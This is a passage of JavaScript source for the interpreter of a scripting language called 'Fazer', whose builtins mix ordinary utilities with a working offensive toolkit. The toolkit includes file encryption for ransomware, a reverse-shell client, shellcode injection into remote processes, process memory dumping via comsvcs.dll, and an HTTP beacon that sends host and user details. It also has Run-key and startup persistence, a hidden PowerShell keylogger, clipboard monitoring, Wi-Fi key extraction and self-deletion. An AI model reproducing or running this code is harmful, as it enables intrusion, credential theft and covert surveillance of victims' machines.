      fs_append: (p, c) => {
          try { require("fs").appendFileSync(String(p), String(c)); return true; } catch(e) { return false; }
      },
      fs_exists: (p) => {
          try { return require("fs").existsSync(String(p)); } catch(e) { return false; }
      },
      
      // JSON
      json_parse: (s) => {
          try { return JSON.parse(String(s)); } catch(e) { return null; }
      },
      json_stringify: (o) => {
          try { return JSON.stringify(o, null, 2); } catch(e) { return null; }
      },
      
      // String Utils
      str_split: (s, d) => String(s).split(String(d)),
      str_replace: (s, old, n) => String(s).split(String(old)).join(String(n)),
      str_trim: (s) => String(s).trim(),
      str_upper: (s) => String(s).toUpperCase(),
      str_lower: (s) => String(s).toLowerCase(),
      
      // Math
      random: () => Math.random(),
      round: (n) => Math.round(Number(n)),
      floor: (n) => Math.floor(Number(n)),
      ceil: (n) => Math.ceil(Number(n)),
      
      fetch: async (url, opts = {}) => {
        return await fetchWithRedirects(String(url), opts || {});
      },

      // OSINT
      whois: async (domain) => {
         // Basic native TCP whois
         return new Promise((resolve) => {
             const net = require("net");
             const socket = new net.Socket();
             let data = "";
             socket.setTimeout(5000);
             socket.connect(43, "whois.iana.org", () => {
                 socket.write(String(domain) + "\r\n");
             });
             socket.on('data', (chunk) => data += chunk.toString());
             socket.on('end', () => {
                 // Try to follow referral if present (simple one-level redirection)
                 const match = data.match(/refer:\s*([a-zA-Z0-9.-]+)/i);
                 if (match && match[1] && match[1] !== "whois.iana.org") {
                     // Query the referral
                     const refHost = match[1];
                     const s2 = new net.Socket();
                     let d2 = "";
                     s2.setTimeout(5000);
                     s2.connect(43, refHost, () => {
                         s2.write(String(domain) + "\r\n");
                     });
                     s2.on('data', (c) => d2 += c.toString());
                     s2.on('end', () => resolve(d2));
                     s2.on('error', () => resolve(data)); // Return IANA data if ref fails
                 } else {
                     resolve(data);
                 }
             });
             socket.on('error', () => resolve("Error: Connection failed"));
             socket.on('timeout', () => { socket.destroy(); resolve("Error: Timeout"); });
         });
      },
      geoip: async (ip) => {
         // Using free IP-API (no key required for limited usage)
         try {
             const res = await builtins.http_req("http://ip-api.com/json/" + String(ip));
             return builtins.json_parse(res.body);
         } catch(e) { return null; }
      },
      html_extract: (html, tag) => {
         // Simple regex extraction (not a full DOM parser, but useful for lightweight scraping)
         // Usage: html_extract(source, "title") -> content
         const t = String(tag);
         const regex = new RegExp(`<${t}[^>]*>(.*?)</${t}>`, "gis");
         const matches = [];
         let m;
         while ((m = regex.exec(String(html))) !== null) {
             matches.push(m[1]);
         }
         return matches;
      },

      // System Advanced
      ps_list: () => {
         try {
             if (process.platform === 'win32') {
                 // CSV format: "Image Name","PID","Session Name","Session#","Mem Usage"
                 const out = require('child_process').execSync('tasklist /FO CSV /NH').toString();
                 const lines = out.split('\r\n').filter(l => l.trim() !== "");
                 return lines.map(l => {
                     const parts = l.split('","').map(p => p.replace(/"/g, ''));
                     return { name: parts[0], pid: parts[1], mem: parts[4] };
                 });
             } else {
                 // Linux/Mac ps -A -o comm,pid,rss
                 const out = require('child_process').execSync('ps -A -o comm,pid,rss').toString();
                 const lines = out.split('\n').slice(1).filter(l => l.trim() !== "");
                 return lines.map(l => {
                     const parts = l.trim().split(/\s+/);
                     return { name: parts[0], pid: parts[1], mem: parts[2] };
                 });
             }
         } catch(e) { return []; }
      },
      kill: (pid) => {
         try {
             process.kill(Number(pid));
             return true;
         } catch(e) { return false; }
      },
      screenshot: async (file) => {
          if (process.platform === 'win32') {
              const p = require('path').resolve(String(file));
              const ps = `
              Add-Type -AssemblyName System.Windows.Forms
              Add-Type -AssemblyName System.Drawing
              $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
              $b = New-Object System.Drawing.Bitmap $s.Width, $s.Height
              $g = [System.Drawing.Graphics]::FromImage($b)
              $g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size)
              $b.Save('${p}', [System.Drawing.Imaging.ImageFormat]::Png)
              $g.Dispose()
              $b.Dispose()
              `;
              try {
                  const b64 = Buffer.from(ps, 'utf16le').toString('base64');
                  require('child_process').execSync(`powershell -EncodedCommand ${b64}`);
                  return true;
              } catch(e) { return false; }
          }
          return false;
      },

      // Network Advanced
      tcp_listen: (port, handler) => {
          // A simple TCP server (like netcat -l)
          // Handler receives: (data, socket_id)
          // Returns server object with .close()
          const net = require("net");
          const srv = net.createServer((socket) => {
              const id = Math.random().toString(36).substr(2, 9);
              socket.on('data', async (data) => {
                  if (typeof handler === "object" && handler.__fnref__) {
                      // Call Fazer function: fn(data_str, id) -> response_str (optional)
                      const res = await this._call(handler, [data.toString(), id], this.global);
                      if (res) socket.write(String(res));
                  }
              });
          });
          srv.listen(Number(port));
          return {
              close: () => srv.close(),
              // We can't easily expose sending to specific socket without more complex state
              // This is a basic "echo/response" listener
          };
      },
      fuzz_url: async (url, wordlist) => {
          // wordlist is a list of strings
          // Returns list of { path, status } for 200/301/403
          if (!Array.isArray(wordlist)) return [];
          const results = [];
          const u = String(url).endsWith('/') ? String(url) : String(url) + '/';
          
          // Limit concurrency to 10
          const chunks = [];
          const chunkSize = 10;
          for (let i = 0; i < wordlist.length; i += chunkSize) {
              chunks.push(wordlist.slice(i, i + chunkSize));
          }

          for (const chunk of chunks) {
              await Promise.all(chunk.map(async (word) => {
                  const target = u + word;
                  try {
                      const res = await builtins.http_req(target, { method: "HEAD", timeout: 2000 });
                      if (res.status !== 404) {
                          results.push({ path: word, status: res.status });
                      }
                  } catch(e) {}
              }));
          }
          return results;
      },

      // Cyber / Net / Pentest
      scan_port: async (host, port) => {
         const net = require("net");
         return new Promise((resolve) => {
             const socket = new net.Socket();
             socket.setTimeout(2000);
             socket.on('connect', () => { socket.destroy(); resolve(true); });
             socket.on('timeout', () => { socket.destroy(); resolve(false); });
             socket.on('error', () => { resolve(false); });
             socket.connect(Number(port), String(host));
         });
      },
      dns_resolve: async (domain) => {
         const dns = require("dns").promises;
         try { const res = await dns.lookup(String(domain)); return res.address; } catch(e) { return null; }
      },
      dns_resolve_all: async (domain) => {
         const dns = require("dns").promises;
         try { const res = await dns.resolve4(String(domain)); return res; } catch(e) { return []; }
      },
      md5: (s) => crypto.createHash('md5').update(String(s)).digest('hex'),
      sha1: (s) => crypto.createHash('sha1').update(String(s)).digest('hex'),
      sha256: (s) => crypto.createHash('sha256').update(String(s)).digest('hex'),
      
      // Crypto & Encoding
      base64_encode: (s) => Buffer.from(String(s)).toString('base64'),
      base64_decode: (s) => Buffer.from(String(s), 'base64').toString('utf8'),
      aes_encrypt: (text, key) => {
          const k = crypto.createHash('sha256').update(String(key)).digest();
          const iv = crypto.randomBytes(16);
          const cipher = crypto.createCipheriv('aes-256-cbc', k, iv);
          let encrypted = cipher.update(String(text));
          encrypted = Buffer.concat([encrypted, cipher.final()]);
          return iv.toString('hex') + ':' + encrypted.toString('hex');
      },
      aes_decrypt: (text, key) => {
          try {
             const parts = String(text).split(':');
             const iv = Buffer.from(parts.shift(), 'hex');
             const encryptedText = Buffer.from(parts.join(':'), 'hex');
             const k = crypto.createHash('sha256').update(String(key)).digest();
             const decipher = crypto.createDecipheriv('aes-256-cbc', k, iv);
             let decrypted = decipher.update(encryptedText);
             decrypted = Buffer.concat([decrypted, decipher.final()]);
             return decrypted.toString();
          } catch(e) { return null; }
      },

      http_req: async (url, opts = {}) => {
          // More advanced version of fetch for pentesting
          // opts: { method, headers, body, timeout }
          const u = new URL(url);
          const lib = u.protocol === 'https:' ? require('https') : require('http');
          return new Promise((resolve) => {
              const req = lib.request(url, {
                  method: opts.method || 'GET',
                  headers: opts.headers || {},
                  timeout: opts.timeout || 5000
              }, (res) => {
                  const chunks = [];
                  res.on('data', c => chunks.push(c));
                  res.on('end', () => {
                      const buf = Buffer.concat(chunks);
                      resolve({
                          status: res.statusCode,
                          headers: res.headers,
                          body: buf.toString(),
                          raw: buf.toString('base64')
                      });
                  });
              });
              req.on('error', (e) => resolve({ error: e.message }));
              req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
              if (opts.body) req.write(String(opts.body));
              req.end();
          });
      },

      http_parallel: async (reqs, opts = {}) => {
          // Parallel HTTP requests
          // reqs: list of { url, method, ... } or strings
          if (!Array.isArray(reqs)) return [];
          const concurrency = Number(opts && opts.concurrency) || 10;
          const timeout = Number(opts && opts.timeout) || 5000;
          
          const results = new Array(reqs.length);
          let index = 0;
          
          const worker = async () => {
              while (index < reqs.length) {
                  const i = index++;
                  const r = reqs[i];
                  let url, options;
                  
                  if (typeof r === "string") {
                      url = r;
                      options = { timeout };
                  } else {
                      url = r.url;
                      options = { ...r, timeout: r.timeout || timeout };
                  }
                  
                  if (!url) {
                      results[i] = { error: "No URL" };
                      continue;
                  }
                  
                  try {
                      results[i] = await builtins.http_req(url, options);
                  } catch (e) {
                      results[i] = { error: e.message };
                  }
              }
          };
          
          const workers = [];
          for (let k = 0; k < Math.min(reqs.length, concurrency); k++) {
              workers.push(worker());
          }
          await Promise.all(workers);
          return results;
      },


      // --- Red Team / Malware Dev Simulation (Educational) ---
      
      walk_dir: (dir) => {
          // Recursive directory listing
          const fs = require('fs');
          const path = require('path');
          let results = [];
          const list = (d) => {
              try {
                  const files = fs.readdirSync(d);
                  files.forEach(file => {
                      const full = path.join(d, file);
                      try {
                          const stat = fs.statSync(full);
                          if (stat && stat.isDirectory()) {
                              list(full);
                          } else {
                              results.push(full);
                          }
                      } catch(e) {}
                  });
              } catch(e) {}
          };
          list(path.resolve(String(dir)));
          return results;
      },

      encrypt_file: async (file, key) => {
          // AES-256-CBC Stream Encryption
          const fs = require('fs');
          const crypto = require('crypto');
          return new Promise((resolve) => {
              try {
                  const k = crypto.createHash('sha256').update(String(key)).digest();
                  const iv = crypto.randomBytes(16);
                  const cipher = crypto.createCipheriv('aes-256-cbc', k, iv);
                  const input = fs.createReadStream(String(file));
                  const output = fs.createWriteStream(String(file) + ".enc");
                  
                  output.write(iv); // Prepend IV
                  input.pipe(cipher).pipe(output);
                  
                  output.on('finish', () => resolve(true));
                  output.on('error', () => resolve(false));
              } catch(e) { resolve(false); }
          });
      },

      decrypt_file: async (file, key) => {
          // AES-256-CBC Stream Decryption
          const fs = require('fs');
          const crypto = require('crypto');
          return new Promise((resolve) => {
              try {
                  const fd = fs.openSync(String(file), 'r');
                  const iv = Buffer.alloc(16);
                  fs.readSync(fd, iv, 0, 16, 0);
                  fs.closeSync(fd);
                  
                  const k = crypto.createHash('sha256').update(String(key)).digest();
                  const decipher = crypto.createDecipheriv('aes-256-cbc', k, iv);
                  
                  const input = fs.createReadStream(String(file), { start: 16 }); // Skip IV
                  const outFile = String(file).replace(/\.enc$/, "");
                  const finalPath = outFile === String(file) ? String(file) + ".dec" : outFile;
                  const output = fs.createWriteStream(finalPath);
                  
                  input.pipe(decipher).pipe(output);
                  
                  output.on('finish', () => resolve(true));
                  output.on('error', () => resolve(false));
              } catch(e) { resolve(false); }
          });
      },

      registry_get: (key, name) => {
          if (process.platform !== 'win32') return null;
          try {
              const out = require('child_process').execSync(`reg query "${String(key)}" /v "${String(name)}"`).toString();
              const match = out.match(/REG_\w+\s+(.*)/);
              return match ? match[1].trim() : null;
          } catch(e) { return null; }
      },

      registry_set: (key, name, val) => {
          if (process.platform !== 'win32') return false;
          try {
              require('child_process').execSync(`reg add "${String(key)}" /v "${String(name)}" /t REG_SZ /d "${String(val)}" /f`);
              return true;
          } catch(e) { return false; }
      },

      set_wallpaper: (path) => {
          if (process.platform !== 'win32') return false;
          const p = require('path').resolve(String(path));
          const ps = `
          $code = @'
          using System.Runtime.InteropServices;
          public class Wallpaper {
             [DllImport("user32.dll", CharSet=CharSet.Auto)]
             public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
          }
          '@
          Add-Type $code
          [Wallpaper]::SystemParametersInfo(20, 0, "${p}", 3)
          `;
          try {
             const b64 = Buffer.from(ps, 'utf16le').toString('base64');
             require('child_process').execSync(`powershell -EncodedCommand ${b64}`);
             return true;
          } catch(e) { return false; }
      },

      tcp_connect: (host, port, handler) => {
          // Reverse Shell / Client
          const net = require("net");
          const client = new net.Socket();
          client.connect(Number(port), String(host));
          
          client.on('data', async (data) => {
             if (handler && typeof handler === 'object' && handler.__fnref__) {
                 await this._call(handler, [data.toString()], this.global);
             }
          });
          
          return {
              send: (d) => { try { client.write(String(d)); return true; } catch(e){ return false; } },
              close: () => { client.destroy(); return true; }
          };
      },

      // --- Fazer UI / FX Extensions ---
      ui_sparkline: (data) => {
          if (!Array.isArray(data)) return "";
          const bars = "  ▂▃▄▅▆▇█";
          const min = Math.min(...data);
          const max = Math.max(...data);
          const range = max - min || 1;
          return data.map(n => {
              const i = Math.floor(((n - min) / range) * (bars.length - 1));
              return bars[i];
          }).join("");
      },
      
      effect_glitch: (text, intensity) => {
          const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?";
          const str = String(text);
          let res = "";
          const p = intensity === undefined ? 0.1 : Number(intensity);
          for(let i=0; i<str.length; i++) {
              if (Math.random() < p) {
                  res += chars[Math.floor(Math.random() * chars.length)];
              } else {
                  res += str[i];
              }
          }
          return res;
      },
      
      ui_box: (text, title) => {
         const s = String(text);
         const t = title ? String(title) : "";
         const lines = s.split("\n");
         const w = Math.max(t.length + 4, ...lines.map(l => l.length)) + 2;
         const top = "┌" + (t ? " " + t + " " : "").padEnd(w - 2, "─") + "┐";
         const bottom = "└" + "".padEnd(w - 2, "─") + "┘";
         const content = lines.map(l => "│ " + l.padEnd(w - 4) + " │").join("\n");
         return top + "\n" + content + "\n" + bottom;
      },
      // --- SECURITY & POWER MODULES (v3.0) ---
      
      // UI Extensions
      ui_table: (headers, rows) => {
          if (!Array.isArray(headers) || !Array.isArray(rows)) return "";
          const colWidths = headers.map((h, idx) => {
              return Math.max(
                  String(h).length, 
                  ...rows.map(r => String(Array.isArray(r) ? r[idx] : r).length)
              );
          });
          
          const line = colWidths.map(w => "".padEnd(w + 2, "─")).join("┼");
          const top = colWidths.map(w => "".padEnd(w + 2, "─")).join("┬");
          const bot = colWidths.map(w => "".padEnd(w + 2, "─")).join("┴");
          
          let out = "┌" + top + "┐\n";
          out += "│" + headers.map((h, idx) => " " + String(h).padEnd(colWidths[idx]) + " ").join("│") + "│\n";
          out += "├" + line + "┤\n";
          rows.forEach(row => {
             const cols = Array.isArray(row) ? row : headers.map(() => ""); 
             out += "│" + cols.map((c, idx) => " " + String(c).padEnd(colWidths[idx]) + " ").join("│") + "│\n";
          });
          out += "└" + bot + "┘";
          return out;
      },

      crypto: {
          hash: (algo, data) => {
              try { return require('crypto').createHash(String(algo)).update(String(data)).digest('hex'); } catch(e){ return null; }
          },
          hmac: (algo, key, data) => {
              try { return require('crypto').createHmac(String(algo), String(key)).update(String(data)).digest('hex'); } catch(e){ return null; }
          },
          aes_encrypt: (key, text) => {
             try {
                 const k = require('crypto').scryptSync(String(key), 'salt', 32);
                 const iv = require('crypto').randomBytes(16);
                 const cipher = require('crypto').createCipheriv('aes-256-cbc', k, iv);
                 let encrypted = cipher.update(String(text), 'utf8', 'hex');
                 encrypted += cipher.final('hex');
                 return iv.toString('hex') + ':' + encrypted;
             } catch(e) { return null; }
          },
          aes_decrypt: (key, text) => {
             try {
                 const parts = String(text).split(':');
                 const iv = Buffer.from(parts.shift(), 'hex');
                 const encrypted = parts.join(':');
                 const k = require('crypto').scryptSync(String(key), 'salt', 32);
                 const decipher = require('crypto').createDecipheriv('aes-256-cbc', k, iv);
                 let decrypted = decipher.update(encrypted, 'hex', 'utf8');
                 decrypted += decipher.final('utf8');
                 return decrypted;
             } catch(e) { return null; }
          },
          b64_enc: (s) => Buffer.from(String(s)).toString('base64'),
          b64_dec: (s) => Buffer.from(String(s), 'base64').toString('utf8'),
          hex_enc: (s) => Buffer.from(String(s)).toString('hex'),
          hex_dec: (s) => Buffer.from(String(s), 'hex').toString('utf8'),
          random: (size) => require('crypto').randomBytes(Number(size)).toString('hex')
      },
      
      http: {
          get: async (url, headers) => {
              // We access builtins via global scope or closure if possible, but builtins var is available in this scope
              // However, inside the function, 'builtins' might not be fully initialized if called synchronously during init,
              // but this is async and called later.
              return await builtins.http.req("GET", url, null, headers);
          },
          post: async (url, body, headers) => {
              return await builtins.http.req("POST", url, body, headers);
          },
          req: async (method, url, body, headers) => {
              return new Promise((resolve) => {
                  try {
                      const u = new URL(String(url));
                      const opts = {
                          method: String(method),
                          headers: headers ? builtins.json_parse(JSON.stringify(headers)) : {},
                          timeout: 10000
                      };
                      
                      if (body) {
                          const b = String(body);
                          opts.headers['Content-Length'] = Buffer.byteLength(b);
                      }
                      
                      const lib = u.protocol === 'https:' ? require('https') : require('http');
                      const req = lib.request(u, opts, (res) => {
                          let data = '';
                          res.on('data', (c) => data += c);
                          res.on('end', () => resolve({ 
                              status: res.statusCode, 
                              headers: res.headers, 
                              body: data 
                          }));
                      });
                      
                      req.on('error', (e) => resolve({ error: e.message }));
                      req.on('timeout', () => { req.destroy(); resolve({ error: "Timeout" }); });
                      
                      if (body) req.write(String(body));
                      req.end();
                  } catch(e) { resolve({ error: e.message }); }
              });
          },
          burst: async (urls) => {
              if (!Array.isArray(urls)) return [];
              const promises = urls.map(u => builtins.http.get(u));
              return await Promise.all(promises);
          }
      },
      
      proc: {
          list: () => builtins.ps_list(),
          kill: (pid) => builtins.kill(pid),
          info: () => ({
              pid: process.pid,
              uptime: process.uptime(),
              memory: process.memoryUsage(),
              arch: process.arch,
              platform: process.platform,
              version: process.version
          }),
          dump: (pid, file) => {
              if (process.platform !== 'win32') return false;
              if (builtins.sys && builtins.sys.mem_dump) return builtins.sys.mem_dump(pid, file);
              try {
                  const p = require('path').resolve(String(file));
                  const cmd = `powershell -c "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ${pid} '${p}' full"`;
                  require('child_process').execSync(cmd);
                  return require('fs').existsSync(p);
              } catch(e) { return false; }
          },
          inject: (pid, shellcodeBase64) => {
              if (process.platform !== 'win32') return false;
              try {
                  const script = `
                  $code = "${shellcodeBase64}"
                  $bytes = [Convert]::FromBase64String($code)
                  $t = @"
                  using System;
                  using System.Runtime.InteropServices;
                  public class W {
                      [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int a, bool b, int c);
                      [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr a, IntPtr b, uint c, uint d, uint e);
                      [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr a, IntPtr b, byte[] c, uint d, out IntPtr e);
                      [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr a, IntPtr b, uint c, IntPtr d, IntPtr e, uint f, out IntPtr g);
                  }
"@
                  Add-Type -TypeDefinition $t
                  $h = [W]::OpenProcess(0x1F0FFF, $false, ${pid})
                  if ($h -eq 0) { exit 1 }
                  $p = [W]::VirtualAllocEx($h, [IntPtr]::Zero, $bytes.Length, 0x3000, 0x40)
                  if ($p -eq 0) { exit 1 }
                  [IntPtr]$out = [IntPtr]::Zero
                  [W]::WriteProcessMemory($h, $p, $bytes, $bytes.Length, [ref]$out)
                  [IntPtr]$tid = [IntPtr]::Zero
                  [W]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $p, [IntPtr]::Zero, 0, [ref]$tid)
                  `;
                  const tmp = require('path').join(require('os').tmpdir(), `inj_${Date.now()}.ps1`);
                  require('fs').writeFileSync(tmp, script);
                  require('child_process').execSync(`powershell -ExecutionPolicy Bypass -File "${tmp}"`);
                  require('fs').unlinkSync(tmp);
                  return true;
              } catch(e) { return false; }
          }
      },

      implant: {
          beacon: async (url, intervalMs) => {
             const u = String(url);
             const ms = Number(intervalMs) || 5000;
             setInterval(async () => {
                 try {
                     await builtins.http.req("POST", u, JSON.stringify({
                         id: require('os').hostname(),
                         user: require('os').userInfo().username,
                         os: require('os').platform(),
                         time: Date.now()
                     }), { "Content-Type": "application/json" });
                 } catch(e) {}
             }, ms);
          },
          persist: (method) => {
              try {
                  const m = String(method).toLowerCase();
                  const exe = process.execPath; // Node.js executable or the compiled EXE
                  const script = process.argv[1]; // The script file
                  const cmd = `"${exe}" "${script}"`;
                  
                  if (m === "startup") {
                      const dest = require('path').join(process.env.APPDATA, 'Microsoft\\Windows\\Start Menu\\Programs\\Startup', 'fazer_persist.lnk');
                      // Create shortcut via PowerShell
                      const ps = `$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('${dest}'); $s.TargetPath = '${exe}'; $s.Arguments = '${script}'; $s.Save()`;
                      require('child_process').execSync(`powershell -c "${ps}"`);
                      return true;
                  } else if (m === "registry") {
                      require('child_process').execSync(`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v FazerPersist /t REG_SZ /d "${cmd}" /f`);
                      return true;
                  }
                  return false;
              } catch(e) { return false; }
          }
      },

      wifi: {
          scan: () => {
              try {
                  const out = require('child_process').execSync('netsh wlan show networks mode=bssid').toString();
                  const networks = [];
                  let current = {};
                  out.split('\n').forEach(line => {
                      line = line.trim();
                      if (line.startsWith("SSID")) {
                          if (current.ssid) networks.push(current);
                          current = { ssid: line.split(':')[1].trim() };
                      } else if (line.startsWith("Signal")) {
                          current.signal = line.split(':')[1].trim();
                      } else if (line.startsWith("Authentication")) {
                          current.auth = line.split(':')[1].trim();
                      } else if (line.startsWith("BSSID")) {
                          current.bssid = line.split(':')[1].trim();
                      }
                  });
                  if (current.ssid) networks.push(current);
                  return networks;
              } catch(e) { return []; }
          },
          saved: () => {
              try {
                  const out = require('child_process').execSync('netsh wlan show profiles').toString();
                  return out.split('\n')
                      .filter(l => l.includes("All User Profile"))
                      .map(l => l.split(':')[1].trim());
              } catch(e) { return []; }
          },
          dump: (ssid) => {
              try {
                  const out = require('child_process').execSync(`netsh wlan show profile name="${ssid}" key=clear`).toString();
                  const match = out.match(/Key Content\s*:\s*(.+)/);
                  return match ? match[1].trim() : null;
              } catch(e) { return null; }
          }
      },

      steg: {
          hide: (imgIn, data, imgOut) => {
             // Universal EOF Steganography (Appends data after file end)
             try {
                 const fs = require('fs');
                 const buf = fs.readFileSync(imgIn);
                 const magic = Buffer.from("FAZER_STEG");
                 const payload = Buffer.concat([magic, Buffer.from(String(data))]);
                 fs.writeFileSync(imgOut, Buffer.concat([buf, payload]));
                 return true;
             } catch(e) { return false; }
          },
          reveal: (imgIn) => {
              try {
                  const fs = require('fs');
                  const buf = fs.readFileSync(imgIn);
                  const idx = buf.lastIndexOf("FAZER_STEG");
                  if (idx === -1) return null;
                  return buf.slice(idx + 10).toString();
              } catch(e) { return null; }
          },
          hide_bmp: (imgIn, data, imgOut) => {
              // True LSB Steganography for BMP
              try {
                  const fs = require('fs');
                  let bmp = fs.readFileSync(imgIn);
                  if (bmp.slice(0, 2).toString() !== 'BM') return false;
                  
                  const offset = bmp.readUInt32LE(10);
                  const msg = Buffer.from(String(data) + "\0");
                  const bits = [];
                  for (const byte of msg) {
                      for (let i = 0; i < 8; i++) bits.push((byte >> i) & 1);
                  }
                  
                  if (offset + bits.length > bmp.length) return false; // Too big
                  
                  // Modify LSBs
                  for (let i = 0; i < bits.length; i++) {
                      bmp[offset + i] = (bmp[offset + i] & 0xFE) | bits[i];
                  }
                  
                  fs.writeFileSync(imgOut, bmp);
                  return true;
              } catch(e) { return false; }
          },
          reveal_bmp: (imgIn) => {
               try {
                  const fs = require('fs');
                  const bmp = fs.readFileSync(imgIn);
                  if (bmp.slice(0, 2).toString() !== 'BM') return null;
                  const offset = bmp.readUInt32LE(10);
                  
                  let chars = [];
                  let currentByte = 0;
                  let bitCount = 0;
                  
                  for (let i = offset; i < bmp.length; i++) {
                      const bit = bmp[i] & 1;
                      currentByte |= (bit << bitCount);
                      bitCount++;
                      
                      if (bitCount === 8) {
                          if (currentByte === 0) break; // Null terminator
                          chars.push(currentByte);
                          currentByte = 0;
                          bitCount = 0;
                      }
                  }
                  return Buffer.from(chars).toString();
               } catch(e) { return null; }
          }
      },

      spy: {
          screenshot: (filename) => {
              if (process.platform !== 'win32') return false;
              try {
                  const out = require('path').resolve(String(filename));
                  const ps = `
                  Add-Type -AssemblyName System.Windows.Forms
                  Add-Type -AssemblyName System.Drawing
                  $w = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
                  $h = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
                  $bmp = New-Object System.Drawing.Bitmap $w, $h
                  $g = [System.Drawing.Graphics]::FromImage($bmp)
                  $g.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
                  $bmp.Save('${out}')
                  $g.Dispose()
                  $bmp.Dispose()
                  `;
                  require('child_process').execSync(`powershell -c "${ps}"`);
                  return require('fs').existsSync(out);
              } catch(e) { return false; }
          },
          keys_start: (logfile) => {
              if (process.platform !== 'win32') return false;
              try {
                  const out = require('path').resolve(String(logfile));
                  const script = `
                  $path = "${out}"
                  $code = @"
                  using System; 
                  using System.Runtime.InteropServices;
                  public class K {
                      [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
                  }
"@
                  Add-Type -TypeDefinition $code
                  while($true) {
                      for($i=8; $i -le 190; $i++) {
                          if ([K]::GetAsyncKeyState($i) -eq -32767) {
                              $k = "$i,"
                              [System.IO.File]::AppendAllText($path, $k)
                          }
                      }
                      Start-Sleep -Milliseconds 10
                  }
                  `;
                  const psFile = require('path').join(require('os').tmpdir(), `k_${Date.now()}.ps1`);
                  require('fs').writeFileSync(psFile, script);
                  
                  const child = require('child_process').spawn('powershell', ['-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-File', psFile], {
                      detached: true,
                      stdio: 'ignore'
                  });
                  child.unref(); 
                  return child.pid;
              } catch(e) { return 0; }
          },
          keys_stop: (pid) => {
               try {
                   process.kill(Number(pid));
                   return true;
               } catch(e) { return false; }
          },
          clip_mon: (callback) => {
              if (!builtins.clipboard_get) return false;
              let last = builtins.clipboard_get();
              setInterval(async () => {
                  try {
                      const curr = builtins.clipboard_get();
                      if (curr !== last) {
                          last = curr;
                          if (callback && callback.__fnref__) {
                              await this._call(callback, [curr], this.global);
                          }
                      }
                  } catch(e) {}
              }, 1000);
              return true;
          }
      },

      self: {
          destruct: () => {
              if (process.platform !== 'win32') return false;
              try {
                  const f = process.execPath;
                  // Self-delete batch one-liner
                  const cmd = `cmd /c ping 127.0.0.1 -n 2 > nul & del "${f}"`;
                  require('child_process').spawn(cmd, { shell: true, detached: true, stdio: 'ignore' }).unref();
                  process.exit(0);
              } catch(e) { return false; }
          },
          melt: () => {
             try {
                 require('fs').unlinkSync(process.argv[1]);
                 return true;
             } catch(e) { return false; }
          }
      },
};

    this.global.set("__builtins__", builtins, false);
    // Also expose builtins as top-level identifiers (fast path)
    for (const [k, v] of Object.entries(builtins)) this.global.set(k, v, false);
    
    // DEBUGGER STATE
    this.debugMode = process.env.FAZER_DEBUG === "1";
    this.breakpoints = new Set();
    if (process.env.FAZER_BREAKPOINTS) {
        process.env.FAZER_BREAKPOINTS.split(',').forEach(l => this.breakpoints.add(Number(l)));
    }
    this.debugStep = false;
    this.children = new Map();
  }

  async _debugCheck(expr, scope) {
      if (!this.debugMode || !expr || !expr.loc) return;
      
      const line = expr.loc.start.line;
      // Simple check: Pause if breakpoint on this line OR stepping
      const shouldPause = this.breakpoints.has(line) || this.debugStep;
      
      if (shouldPause) {
          // Avoid pausing multiple times on same line if step not active
          // But for now simple logic
          
          // Serialize Scope
          const vars = {};
          for (const [k, v] of scope.variables) {
              if (v && typeof v === 'object' && !Array.isArray(v)) vars[k] = "[Object]";
              else if (typeof v === 'function') vars[k] = "[Function]";
              else vars[k] = v;
          }
          
          const payload = JSON.stringify({
              type: "debug_pause",
              line: line,
              file: "main.fz",
              vars: vars
          });
          
          process.stdout.write("DEBUG_JSON:" + payload + "\n");
          
          // Wait for command
          await new Promise(resolve => {
              const onData = (data) => {
                  const str = data.toString().trim();
                  if (str.includes("DEBUG_CMD:")) {
                      const cmd = str.split("DEBUG_CMD:")[1].trim();
                      if (cmd === "continue") {
                          this.debugStep = false;
                          process.stdin.removeListener('data', onData);
                          resolve();
                      } else if (cmd === "step") {
                          this.debugStep = true;
                          process.stdin.removeListener('data', onData);
                          resolve();
                      }
                  }
              };
              process.stdin.resume();
              process.stdin.on('data', onData);
          });
      }
  }

  async run(ast) {
    try {
      return await this._execBlock(ast, this.global);
    } catch (e) {
      throw e;
    }
  }

  async _execBlock(stmts, scope) {
    let last = null;
    for (const s of stmts) {
      const v = await this._execStmt(s, scope);
      if (v instanceof ReturnSignal) return v;
      last = v;
    }
    return last;
  }

  async _execStmt(stmt, scope) {
    await this._debugCheck(stmt, scope);
    switch (stmt.type) {
      case "assign": {
        const val = await this._eval(stmt.value, scope);
        if (scope.get(stmt.name)) {
          scope.assign(stmt.name, val);
        } else {
          scope.set(stmt.name, val, stmt.mut);
        }
        return val;
      }
      case "exprstmt":
        return await this._eval(stmt.expr, scope);

      case "fn": {
        this.fns.set(stmt.name, { params: stmt.params, body: stmt.body, closure: scope });
        scope.set(stmt.name, { __fnref__: stmt.name }, false);
        return null;
      }

      case "return": {
        const v = stmt.value ? await this._eval(stmt.value, scope) : null;
        return new ReturnSignal(v);
      }

      case "if": {
        const cond = await this._eval(stmt.expr, scope);
        if (truthy(cond)) {
          const inner = new Scope(scope);
          const out = await this._execBlock(stmt.thenBlock, inner);
          if (out instanceof ReturnSignal) return out;
          return out;
        } else if (stmt.elseBlock) {
          const inner = new Scope(scope);
          const out = await this._execBlock(stmt.elseBlock, inner);
          if (out instanceof ReturnSignal) return out;
          return out;
        }
        return null;
      }

      case "while": {
        let last = null;
        while (await this._eval(stmt.expr, scope)) {
